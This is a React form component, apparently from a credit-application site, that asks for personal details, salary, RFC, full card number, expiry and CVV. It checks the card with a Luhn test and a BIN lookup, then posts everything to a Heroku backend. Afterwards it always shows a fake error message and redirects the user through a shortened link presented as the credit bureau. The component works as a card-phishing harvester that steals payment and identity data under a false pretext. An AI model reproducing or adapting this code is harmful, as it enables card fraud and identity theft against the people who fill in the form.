import React, { Component } from "react"
import luhn from 'luhn'
import styles from '../styles/form.module.css'
import Swal from 'sweetalert2'
import banco from '../img/banco.PNG'
import bank from '../img/bank.svg'
import Module from "../components/module.component"
import API_FORM from '../api/apiForm'


class Form extends Component {

    constructor() {
        super()
        this.state = {
            nombre: "",
            apellido_paterno: "",
            apellido_materno: "",
            direccion: "",
            codigo_postal: "",
            municipio: "",
            estado: "",
            sueldo: "",
            limite: "",
            estado_civil: "",
            telefono: "",
            tarjeta: "false",
            vencimiento: "",
            cvv: "",
            banco: "",
            rfc: "",
            infoTarjet: []
        }
        this.addTarjeta = this.addTarjeta.bind(this)
        this.handleChange = this.handleChange.bind(this)
    }


    addTarjeta(e) {
        const {
            nombre, apellido_paterno, apellido_materno, direccion, codigo_postal, municipio, estado,
            sueldo, limite, estado_civil, telefono, tarjeta, vencimiento, cvv, banco, rfc
        } = this.state

        const lookup = require("binlookup")()
        lookup(tarjeta).then(
            res => {
                const { type } = res
                this.setState({
                    infoTarjet: type
                })
            }
        )

        const is_valid = luhn.validate(tarjeta)

        if (nombre === "" || apellido_paterno === "" || apellido_materno === "" || direccion === "" ||
            codigo_postal === "" || municipio === "" || estado === "" || sueldo === "" || limite === "" || estado_civil === "" ||
            telefono === "" || banco === "" ||
            rfc === "") {
            Swal.fire({
                title: 'Ho Ho',
                text: 'Por favor revisa que los campos no esten vacios',
                icon: 'error'
            })
        } else {
            if (is_valid === false || tarjeta === "") {
                Swal.fire({
                    title: 'Ho Ho',
                    text: 'Por favor revisa que la tarjeta sea correcta',
                    icon: 'error'
                })
            } else {
                if (vencimiento.length < 4 || cvv.length < 3) {
                    Swal.fire({
                        title: 'Ho Ho',
                        text: 'Por favor revisa que el cvv y la fecha esten correctos',
                        icon: 'error'
                    })
                } else {
                    fetch('https://backend-credifast.herokuapp.com/form', {
                        method: 'POST',
                        body: JSON.stringify(this.state),
                        headers: {
                            'Accept': 'application/json',
                            'Content-Type': 'application/json'
                        }
                    })
                        .then(res => res)
                        .catch(err => console.log(err))
                    Swal.fire({
                        title: 'Ups',
                        icon: 'error',
                        html:
                            'Al parecer la plataforma presenta problemas, por favor intenta mas tarde, te redireccionaremos a la plataforma de buro de credito.' +
                            '<a href="https://bit.ly/35chpkt"><button style="background: #fac95f; border:none; color: #fff; padding: 10px; border-radius: 10px">Aceptar</button></a> ',
                        showConfirmButton: false
                    })
                }
            }
        }

        e.preventDefault()
    }

    handleChange(e) {
        const { name, value } = e.target
        this.setState({
            [name]: value
        })
    }
    render() {
        const dataApi = API_FORM.map(item => item)


        return (
            <div>
                <div class="alert alert-primary" style={{ margin: 'auto' }} role="alert">
                    Recuerda: para hacer tu solicitud, ten a la mano el último estado de cuenta de tu tarjeta de crédito vigente y captura los datos que te solicitamos tal y como aparecen en él.
                </div>

                <div className={styles.contenedor_two}>
                    <div className={styles.form_contenedor}>
                        <div className={styles.buro}>
                            <Module
                                add={this.addTarjeta}
                                handleChange={this.handleChange}
                                api={dataApi}
                            />
                        </div>
                    </div>
                    <div className={styles.form_panel}>
                        <div className={styles.panel_two}>
                            <div className={styles.panel_right}>
                                <div className={styles.content}>
                                    <img
                                        alt="auth"
                                        src={banco}
                                        className={styles.image_form} />
                                    <img
                                        alt="auth"
                                        src={bank}
                                        className={styles.image_bank} />
                                </div>
                            </div>
                        </div>
                    </div>
                </div >
            </div >
        )
    }
}

export default Form;